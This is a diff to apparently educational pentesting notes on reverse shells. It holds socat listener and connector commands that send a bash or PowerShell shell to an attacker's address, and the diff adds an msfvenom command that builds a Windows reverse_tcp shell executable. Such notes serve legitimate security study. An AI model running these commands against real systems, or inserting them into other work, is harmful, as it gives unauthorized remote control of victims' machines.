@@ -1,7 +1,3 @@
-```Bash
-
-```
-
 ## Netcat
 The syntax for starting a netcat listener using Linux is this:
 ```Bash
@@ -24,13 +20,16 @@ Now, when we set up our reverse shell listener, we use below command to listen o
 ```bash
 Listener -
 socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
+
 Connector -
 socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
+
 For Windows Target-
 ```bash
 Listener -
 socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+
 Connector -
 socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:"powershell.exe,pipes"
 ```
@@ -59,4 +58,9 @@ Before we go any further, there are another two concepts which must be introduce
 
 **Stageless** payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
 
-***For example*** - **shell_reverse_tcp**. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (_). The staged equivalent to this payload would be: **shell/reverse_tcp**
+***For example*** - `shell_reverse_tcp`. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (_). The staged equivalent to this payload would be: `shell/reverse_tcp`
+
+### Common command to generate a payload
+```
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+```
